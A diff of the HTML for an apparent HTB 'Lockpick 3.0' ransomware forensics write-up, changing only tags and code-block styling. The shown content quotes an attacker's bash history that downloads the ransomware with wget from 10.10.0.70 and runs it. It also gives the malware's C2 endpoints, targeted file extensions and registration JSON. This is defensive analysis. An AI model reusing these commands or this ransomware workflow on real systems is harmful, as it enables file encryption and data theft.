@@ -24,7 +24,7 @@
     <meta name="description" content="A ELF64 ransomware binary uses XOR string obfuscation keyed on a CLI passphrase, contacts a DigitalOcean C2 to register and retrieve an AES-256-CBC key and IV, recursively encrypts target files in /share/ renaming them to .24bes, exfiltrates the originals via HTTP PUT, zeroes and removes the source files, and installs a systemd service for persistence.">
   
   
-    <meta name="keywords" content="Malware Analysis,Reverse Engineering,Ransomware,ELF64,Linux,AES,Volatility Framework,IDA,">
+    <meta name="keywords" content="Malware Analysis,Reverse Engineering,Ransomware,ELF64,Linux,AES,Volatility3,IDA,">
   
   
   
@@ -234,7 +234,7 @@
     
     "dateModified": "2026-03-15T00:00:00\u002b00:00",
     
-    "keywords": ["Malware Analysis","Reverse Engineering","Ransomware","ELF64","Linux","AES","Volatility Framework","IDA"],
+    "keywords": ["Malware Analysis","Reverse Engineering","Ransomware","ELF64","Linux","AES","Volatility3","IDA"],
     
     "mainEntityOfPage": "true",
     "wordCount": "1189"
@@ -713,11 +713,11 @@
 
               </a>
             
-              <a class="relative mt-[0.5rem] me-2" href="/tags/volatility-framework/">
+              <a class="relative mt-[0.5rem] me-2" href="/tags/volatility3/">
                 <span class="flex cursor-pointer">
   <span
     class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
-    Volatility Framework
+    Volatility3
   </span>
 </span>
 
@@ -727,7 +727,7 @@
                 <span class="flex cursor-pointer">
   <span
     class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
-    IDA
+    Ida
   </span>
 </span>
 
@@ -1016,30 +1016,30 @@
     
 </h4>
 <p>Memory analysis of the VMware snapshot (<code>ubuntu-client-Snapshot2.vmem</code>) using Volatility 3 revealed two distinct bash sessions. The insider (PID 636) executed the malicious binary multiple times with the argument <code>xGonnaGiveIt2Ya</code> before deleting it to cover their tracks. A remote attacker (PID 22683) subsequently connected over SSH, re-downloaded the binary from <code>10.10.0.70</code> and executed it again. Also show modifications to <code>/etc/ssh/sshd_config</code>.</p>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="ln"> 1</span><span class="cl">PS C:\Users\s\Desktop\lockpick3 &gt; vol -f .\ubuntu-client-Snapshot2.vmem linux.bash.Bash
-</span></span><span class="line"><span class="ln"> 2</span><span class="cl">Volatility 3 Framework 2.27.0
-</span></span><span class="line"><span class="ln"> 3</span><span class="cl">Progress:  100.00               Stacking attempts finished
-</span></span><span class="line"><span class="ln"> 4</span><span class="cl">PID     Process CommandTime     Command
-</span></span><span class="line"><span class="ln"> 5</span><span class="cl">...[snip]...
-</span></span><span class="line"><span class="ln"> 6</span><span class="cl">636     bash    2024-06-03 10:49:32.000000 UTC  nano /etc/ssh/sshd_config
-</span></span><span class="line"><span class="ln"> 7</span><span class="cl">636     bash    2024-06-03 10:50:30.000000 UTC  ip a
-</span></span><span class="line"><span class="ln"> 8</span><span class="cl">636     bash    2024-06-03 10:51:41.000000 UTC  nano /etc/ssh/sshd_config
-</span></span><span class="line"><span class="ln"> 9</span><span class="cl">636     bash    2024-06-03 10:53:22.000000 UTC  systemctl restart shh
-</span></span><span class="line"><span class="ln">10</span><span class="cl">636     bash    2024-06-03 10:53:29.000000 UTC  sudo
-</span></span><span class="line"><span class="ln">11</span><span class="cl">636     bash    2024-06-03 10:53:29.000000 UTC  systemctl restart ssh
-</span></span><span class="line"><span class="ln">12</span><span class="cl">636     bash    2024-06-03 11:21:30.000000 UTC  ls
-</span></span><span class="line"><span class="ln">13</span><span class="cl">636     bash    2024-06-03 15:31:03.000000 UTC  sudo apt-get install apache2
-</span></span><span class="line"><span class="ln">14</span><span class="cl">636     bash    2024-06-03 15:32:44.000000 UTC  ./ubuntu-client xGonnaGiveIt2Ya
-</span></span><span class="line"><span class="ln">15</span><span class="cl">636     bash    2024-06-03 15:36:00.000000 UTC  ./ubuntu-client xGonnaGiveIt2Ya
-</span></span><span class="line"><span class="ln">16</span><span class="cl">636     bash    2024-06-03 15:40:24.000000 UTC  ./ubuntu-client xGonnaGiveIt2Ya
-</span></span><span class="line"><span class="ln">17</span><span class="cl">636     bash    2024-06-03 15:50:57.000000 UTC  rm ubuntu-client
-</span></span><span class="line"><span class="ln">18</span><span class="cl">...[snip]...
-</span></span><span class="line"><span class="ln">19</span><span class="cl">22683   bash    2024-06-03 15:51:25.000000 UTC  mdkir /share
-</span></span><span class="line"><span class="ln">20</span><span class="cl">22683   bash    2024-06-03 15:51:25.000000 UTC  wget http://10.10.0.70:8123/ubuntu-client
-</span></span><span class="line"><span class="ln">21</span><span class="cl">22683   bash    2024-06-03 15:51:25.000000 UTC  wget http://10.10.0.70:8000/ubuntu-client
-</span></span><span class="line"><span class="ln">22</span><span class="cl">22683   bash    2024-06-03 15:51:38.000000 UTC  ./ubuntu-client xGonnaGiveIt2Ya
-</span></span><span class="line"><span class="ln">23</span><span class="cl">22683   bash    2024-06-03 15:54:24.000000 UTC  sudo apt-get install libcjson-dev
-</span></span><span class="line"><span class="ln">24</span><span class="cl">22683   bash    2024-06-03 15:54:31.000000 UTC  ./ubuntu-client xGonnaGiveIt2Ya</span></span></code></pre></div></div>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span>PS C:\Users\s\Desktop\lockpick3 &gt; vol -f .\ubuntu-client-Snapshot2.vmem linux.bash.Bash
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span>Volatility 3 Framework 2.27.0
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span>Progress:  100.00               Stacking attempts finished
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span>PID     Process CommandTime     Command
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span>...[snip]...
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span>636     bash    2024-06-03 10:49:32.000000 UTC  nano /etc/ssh/sshd_config
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span>636     bash    2024-06-03 10:50:30.000000 UTC  ip a
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span>636     bash    2024-06-03 10:51:41.000000 UTC  nano /etc/ssh/sshd_config
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span>636     bash    2024-06-03 10:53:22.000000 UTC  systemctl restart shh
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span>636     bash    2024-06-03 10:53:29.000000 UTC  sudo
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span><span>636     bash    2024-06-03 10:53:29.000000 UTC  systemctl restart ssh
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span><span>636     bash    2024-06-03 11:21:30.000000 UTC  ls
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span><span>636     bash    2024-06-03 15:31:03.000000 UTC  sudo apt-get install apache2
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14</span><span>636     bash    2024-06-03 15:32:44.000000 UTC  ./ubuntu-client xGonnaGiveIt2Ya
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15</span><span>636     bash    2024-06-03 15:36:00.000000 UTC  ./ubuntu-client xGonnaGiveIt2Ya
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16</span><span>636     bash    2024-06-03 15:40:24.000000 UTC  ./ubuntu-client xGonnaGiveIt2Ya
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17</span><span>636     bash    2024-06-03 15:50:57.000000 UTC  rm ubuntu-client
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18</span><span>...[snip]...
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19</span><span>22683   bash    2024-06-03 15:51:25.000000 UTC  mdkir /share
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20</span><span>22683   bash    2024-06-03 15:51:25.000000 UTC  wget http://10.10.0.70:8123/ubuntu-client
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21</span><span>22683   bash    2024-06-03 15:51:25.000000 UTC  wget http://10.10.0.70:8000/ubuntu-client
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22</span><span>22683   bash    2024-06-03 15:51:38.000000 UTC  ./ubuntu-client xGonnaGiveIt2Ya
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23</span><span>22683   bash    2024-06-03 15:54:24.000000 UTC  sudo apt-get install libcjson-dev
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24</span><span>22683   bash    2024-06-03 15:54:31.000000 UTC  ./ubuntu-client xGonnaGiveIt2Ya</span></span></code></pre></div></div>
 
 <h3 class="relative group"><span style="color:red">Initial Analysis</span>
     <div id="initial-analysis" class="anchor"></div>
@@ -1050,18 +1050,18 @@
     </span>
     
 </h3>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="ln"> 1</span><span class="cl">.\ubuntu-client: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked,
-</span></span><span class="line"><span class="ln"> 2</span><span class="cl">interpreter /lib64/ld-linux-x86-64.so.2,
-</span></span><span class="line"><span class="ln"> 3</span><span class="cl">BuildID[sha1]=595b1b2a3a1451774884ddc5d265e25a44e21574, for GNU/Linux 3.2.0, stripped
-</span></span><span class="line"><span class="ln"> 4</span><span class="cl">┌─────────────┬────────────────────────────────────────────────────────────────────────────────────┐
-</span></span><span class="line"><span class="ln"> 5</span><span class="cl">│ md5         │ a2444b61b65be96fc2e65924dee8febd                                                   │
-</span></span><span class="line"><span class="ln"> 6</span><span class="cl">│ sha1        │ 071de351a8c1d4df1437c8d68e217a19c719c7af                                           │
-</span></span><span class="line"><span class="ln"> 7</span><span class="cl">│ sha256      │ fc519667f03cb94ab7675c0427da42a38abb8675dda4b53cea814499040c0947                   │
-</span></span><span class="line"><span class="ln"> 8</span><span class="cl">│ os          │ linux                                                                              │
-</span></span><span class="line"><span class="ln"> 9</span><span class="cl">│ format      │ elf                                                                                │
-</span></span><span class="line"><span class="ln">10</span><span class="cl">│ arch        │ amd64                                                                              │
-</span></span><span class="line"><span class="ln">11</span><span class="cl">│ path        │ C:/Users/s/Desktop/lockpick3/ubuntu-client                                         │
-</span></span><span class="line"><span class="ln">12</span><span class="cl">└─────────────┴────────────────────────────────────────────────────────────────────────────────────┘</span></span></code></pre></div></div>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span>.\ubuntu-client: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked,
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span>interpreter /lib64/ld-linux-x86-64.so.2,
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span>BuildID[sha1]=595b1b2a3a1451774884ddc5d265e25a44e21574, for GNU/Linux 3.2.0, stripped
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span>┌─────────────┬────────────────────────────────────────────────────────────────────────────────────┐
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span>│ md5         │ a2444b61b65be96fc2e65924dee8febd                                                   │
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span>│ sha1        │ 071de351a8c1d4df1437c8d68e217a19c719c7af                                           │
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span>│ sha256      │ fc519667f03cb94ab7675c0427da42a38abb8675dda4b53cea814499040c0947                   │
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span>│ os          │ linux                                                                              │
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span>│ format      │ elf                                                                                │
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span>│ arch        │ amd64                                                                              │
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span><span>│ path        │ C:/Users/s/Desktop/lockpick3/ubuntu-client                                         │
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span><span>└─────────────┴────────────────────────────────────────────────────────────────────────────────────┘</span></span></code></pre></div></div>
 
 <h4 class="relative group"><span style="color:red">Strings</span>
     <div id="strings" class="anchor"></div>
@@ -1073,31 +1073,31 @@
     
 </h4>
 <p>Static analysis of the binary revealed its core capabilities before any reversing. The malware uses <strong>AES-256-CBC</strong> likely to encrypt files with extensions <code>.txt .pdf .sql .db .docx .xlsx .pptx .zip .tar .tar.gz</code>, renaming each to <code>.24bes</code>. Communication with the C2 server is handled via <code>libcurl</code> over HTTPS using two endpoints: <code>/connect</code> and <code>/upload/</code>.</p>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="ln"> 1</span><span class="cl">EVP_EncryptUpdate
-</span></span><span class="line"><span class="ln"> 2</span><span class="cl">EVP_EncryptInit
-</span></span><span class="line"><span class="ln"> 3</span><span class="cl">EVP_aes_256_cbc
-</span></span><span class="line"><span class="ln"> 4</span><span class="cl">EVP_CIPHER_CTX_new
-</span></span><span class="line"><span class="ln"> 5</span><span class="cl">EVP_EncryptFinal
-</span></span><span class="line"><span class="ln"> 6</span><span class="cl">EVP_CIPHER_CTX_free
-</span></span><span class="line"><span class="ln"> 7</span><span class="cl">...[snip]...
-</span></span><span class="line"><span class="ln"> 8</span><span class="cl">Content-Type: application/json
-</span></span><span class="line"><span class="ln"> 9</span><span class="cl">/connect
-</span></span><span class="line"><span class="ln">10</span><span class="cl">key
-</span></span><span class="line"><span class="ln">11</span><span class="cl">client_id
-</span></span><span class="line"><span class="ln">12</span><span class="cl">{&#34;passphrase&#34;: &#34;%s&#34;, &#34;hostname&#34;: &#34;%s&#34;}
-</span></span><span class="line"><span class="ln">13</span><span class="cl">.txt
-</span></span><span class="line"><span class="ln">14</span><span class="cl">.pdf
-</span></span><span class="line"><span class="ln">15</span><span class="cl">.sql
-</span></span><span class="line"><span class="ln">16</span><span class="cl">.db
-</span></span><span class="line"><span class="ln">17</span><span class="cl">.docx
-</span></span><span class="line"><span class="ln">18</span><span class="cl">.xlsx
-</span></span><span class="line"><span class="ln">19</span><span class="cl">.pptx
-</span></span><span class="line"><span class="ln">20</span><span class="cl">.zip
-</span></span><span class="line"><span class="ln">21</span><span class="cl">.tar
-</span></span><span class="line"><span class="ln">22</span><span class="cl">.tar.gz
-</span></span><span class="line"><span class="ln">23</span><span class="cl">X-Filename: %s
-</span></span><span class="line"><span class="ln">24</span><span class="cl">/upload/
-</span></span><span class="line"><span class="ln">25</span><span class="cl">%s.24bes</span></span></code></pre></div></div>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span>EVP_EncryptUpdate
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span>EVP_EncryptInit
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span>EVP_aes_256_cbc
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span>EVP_CIPHER_CTX_new
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span>EVP_EncryptFinal
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span>EVP_CIPHER_CTX_free
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span>...[snip]...
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span>Content-Type: application/json
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span>/connect
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span>key
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span><span>client_id
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span><span>{&#34;passphrase&#34;: &#34;%s&#34;, &#34;hostname&#34;: &#34;%s&#34;}
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span><span>.txt
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14</span><span>.pdf
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15</span><span>.sql
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16</span><span>.db
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17</span><span>.docx
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18</span><span>.xlsx
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19</span><span>.pptx
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20</span><span>.zip
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21</span><span>.tar
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22</span><span>.tar.gz
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23</span><span>X-Filename: %s
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24</span><span>/upload/
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25</span><span>%s.24bes</span></span></code></pre></div></div>
 
 <h3 class="relative group"><span style="color:red">Reversing with IDA</span>
     <div id="reversing-with-ida" class="anchor"></div>
@@ -1307,7 +1307,7 @@
     sizes="(min-width: 768px) 50vw, 65vw"
     data-zoom-src="/investigations/htb-lockpick3.0/image5.png"></figure>
 </p>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="ln">1</span><span class="cl"><span class="p">{</span><span class="nt">&#34;passphrase&#34;</span><span class="p">:</span> <span class="s2">&#34;sebh24&#34;</span><span class="p">,</span> <span class="nt">&#34;hostname&#34;</span><span class="p">:</span> <span class="s2">&#34;&lt;victim_hostname&gt;&#34;</span><span class="p">}</span></span></span></code></pre></div></div>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-json" data-lang="json"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span>{<span style="color:#f92672">&#34;passphrase&#34;</span>: <span style="color:#e6db74">&#34;sebh24&#34;</span>, <span style="color:#f92672">&#34;hostname&#34;</span>: <span style="color:#e6db74">&#34;&lt;victim_hostname&gt;&#34;</span>}</span></span></code></pre></div></div>
 <p>On success, the C2 responds with a JSON object containing three fields parsed via <code>cJSON</code>:</p>
 <p><figure><img
     class="my-0 rounded-md"
@@ -1356,13 +1356,13 @@
     
 </h4>
 <p>The malware implements a <strong>recursive directory traversal</strong> starting at <code>/share/</code>, targeting files with the following extensions:</p>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="ln">1</span><span class="cl"><span class="n">s2</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="s">&#34;.txt&#34;</span><span class="p">;</span>   <span class="n">s2</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="s">&#34;.pdf&#34;</span><span class="p">;</span>   <span class="n">s2</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="s">&#34;.sql&#34;</span><span class="p">;</span>
-</span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="n">s2</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="s">&#34;.db&#34;</span><span class="p">;</span>    <span class="n">s2</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="s">&#34;.docx&#34;</span><span class="p">;</span>  <span class="n">s2</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">=</span> <span class="s">&#34;.xlsx&#34;</span><span class="p">;</span>
-</span></span><span class="line"><span class="ln">3</span><span class="cl"><span class="n">s2</span><span class="p">[</span><span class="mi">6</span><span class="p">]</span> <span class="o">=</span> <span class="s">&#34;.pptx&#34;</span><span class="p">;</span>  <span class="n">s2</span><span class="p">[</span><span class="mi">7</span><span class="p">]</span> <span class="o">=</span> <span class="s">&#34;.zip&#34;</span><span class="p">;</span>   <span class="n">s2</span><span class="p">[</span><span class="mi">8</span><span class="p">]</span> <span class="o">=</span> <span class="s">&#34;.tar&#34;</span><span class="p">;</span>
-</span></span><span class="line"><span class="ln">4</span><span class="cl"><span class="n">s2</span><span class="p">[</span><span class="mi">9</span><span class="p">]</span> <span class="o">=</span> <span class="s">&#34;.tar.gz&#34;</span><span class="p">;</span></span></span></code></pre></div></div>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span>s2[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;.txt&#34;</span>;   s2[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;.pdf&#34;</span>;   s2[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;.sql&#34;</span>;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span>s2[<span style="color:#ae81ff">3</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;.db&#34;</span>;    s2[<span style="color:#ae81ff">4</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;.docx&#34;</span>;  s2[<span style="color:#ae81ff">5</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;.xlsx&#34;</span>;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span><span>s2[<span style="color:#ae81ff">6</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;.pptx&#34;</span>;  s2[<span style="color:#ae81ff">7</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;.zip&#34;</span>;   s2[<span style="color:#ae81ff">8</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;.tar&#34;</span>;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4</span><span>s2[<span style="color:#ae81ff">9</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;.tar.gz&#34;</span>;</span></span></code></pre></div></div>
 <p>Each matching file is <strong>exfiltrated</strong> to the C2 via an HTTP PUT request before any encryption occurs:</p>
